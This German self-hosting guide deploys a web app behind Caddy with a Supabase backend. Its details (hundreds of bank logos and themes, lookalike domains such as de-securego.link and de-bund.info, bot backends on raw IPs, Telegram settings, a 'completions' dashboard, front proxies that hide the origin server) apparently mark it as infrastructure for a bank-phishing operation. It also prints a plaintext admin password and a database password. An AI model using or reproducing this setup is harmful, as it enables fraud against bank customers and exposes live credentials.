# Self-Hosting auf Ubuntu 24.04 (Single VPS)

Diese Anleitung deployt die komplette App als **Docker-Container** hinter
**Caddy** (auto-SSL) auf einem einzigen Ubuntu-24.04-Server mit einer
öffentlichen IPv4-Adresse. Backend/DB/Storage laufen auf **Supabase**
(bereits mit allen Daten befüllt: `vaedzpcyxmkaksijmrgo.supabase.co`).

Andere VPS können per Reverse-Proxy auf diesen Host zeigen – Domain-Routing,
Adress-Pool, Themes, Logos, VR-Splash, GenosGFG-Font, Bot-Proxy und Admin
funktionieren dann automatisch (Host-Header-basiertes Matching gegen
`domain_routes` in Supabase).

---

## 0. Was schon fertig ist

- ✅ Supabase-Schema, Policies, Trigger, Functions
- ✅ 638 Banken, 6 Gruppen, 16 Adressen, 6 Domain-Routes
- ✅ 653 Bank-Logos in Storage (`bank-logos`, public)
- ✅ Admin-User `admin@vr.de` mit Passwort `uodo3289FASU§"&(`
- ✅ Build-Umstellung auf Node-Preset (via `SELF_HOST=1`)
- ✅ `nip.io`-Workaround entfernt (Node darf direkte IPs fetchen)
- ✅ Dockerfile, docker-compose, Caddyfile, .env.example

---

## 1. Server vorbereiten

```bash
apt update && apt install -y docker.io docker-compose-v2 git curl caddy ufw
systemctl enable --now docker caddy
ufw allow 22,80,443/tcp && ufw --force enable
```

## 2. Repo clonen

Push das Projekt zu Git (GitHub/GitLab/self-hosted), dann:

```bash
git clone <dein-repo-url> /opt/app
cd /opt/app
cp .env.example .env
# → falls du eigene TELEGRAM-Werte hast, jetzt in .env eintragen
```

## 3. Docker bauen & starten

```bash
cd /opt/app
docker compose up -d --build
docker compose logs -f app   # optional: prüfen dass er :3000 hört
```

## 4. Caddy als Reverse-Proxy (Auto-SSL)

Trage in `/etc/caddy/Caddyfile` **alle** Domains ein, die auf diese VPS
zeigen (kommasepariert). Beispiel:

```
de-securego.link, www.de-securego.link,
de-bund.info, www.de-bund.info,
de-aktualisierung.com, www.de-aktualisierung.com,
de-servicecenter.com, www.de-servicecenter.com {
    encode zstd gzip
    reverse_proxy 127.0.0.1:3000 {
        header_up Host {host}
        header_up X-Forwarded-Host {host}
        header_up X-Forwarded-Proto {scheme}
        header_up X-Real-IP {remote_host}
    }
}
```

```bash
cp /opt/app/Caddyfile /etc/caddy/Caddyfile   # optional als Vorlage
# → Datei editieren, Domains eintragen
systemctl reload caddy
```

Caddy zieht automatisch Let's-Encrypt-Zertifikate für jede Domain, sobald
DNS auf die VPS zeigt.

## 5. DNS

Für jede Domain einen **A-Record** auf die VPS-IP setzen. Bei
Reverse-Proxy-Setup: A-Record auf den jeweiligen Frontline-VPS, der dann
per `reverse_proxy` auf diesen Host weitergibt (siehe unten).

## 6. Reverse-Proxy von anderen VPS

Auf einem separaten Front-VPS (z.B. hinter Cloudflare), Caddyfile:

```
kunde-domain.com {
    reverse_proxy https://dein-host-vps.tld {
        header_up Host {host}
        header_up X-Forwarded-Host {host}
    }
}
```

Der App-Backend liest `Host` bzw. `X-Forwarded-Host` und routet gegen
`domain_routes` in Supabase → passendes Bot-Backend / passender Adress-Pool
wird automatisch gewählt. **Keine App-Änderung nötig**.

## 7. Bot-Backends erreichbar machen

Die Backends laufen auf IPs wie `217.156.64.64:8080`, `91.208.197.52:8080`.
Wenn die Backends eine Firewall haben, dort die VPS-IP whitelisten.

## 8. Updates ausrollen

```bash
cd /opt/app
git pull
docker compose up -d --build
```

## 9. Verwaltung

- Admin-UI: `https://<eine-deiner-domains>/auth` → mit `admin@vr.de` einloggen
- Adress-Pool pflegen: `/admin/addresses`
- Domain-Routes verwalten: `/admin/domains`
- Filialen / Themes: `/admin/banks`
- Completions-Dashboard: `/admin/completions`

## 10. Backups

Supabase erstellt automatisch Backups (Free-Plan: 7 Tage). Für zusätzliche
DB-Dumps:

```bash
PGPASSWORD='4Swg9vx5mUvpBtHa' pg_dump \
  "host=db.vaedzpcyxmkaksijmrgo.supabase.co user=postgres dbname=postgres sslmode=require" \
  > backup-$(date +%F).sql
```

---

## Troubleshooting

- **Container startet nicht** → `docker compose logs app`
- **502 in Caddy** → App läuft nicht (`docker compose ps`) oder falscher Port
- **Bot-Requests time-outen** → VPS-Firewall lässt ausgehend `:8080` nicht raus
  oder Bot-Backend blockt VPS-IP
- **Login "Unsupported provider"** → Auth-Provider im Supabase-Dashboard aktivieren
- **Admin-Login geht nicht** → Passwort im Supabase-Dashboard resetten:
  Authentication → Users → admin@vr.de → Reset Password
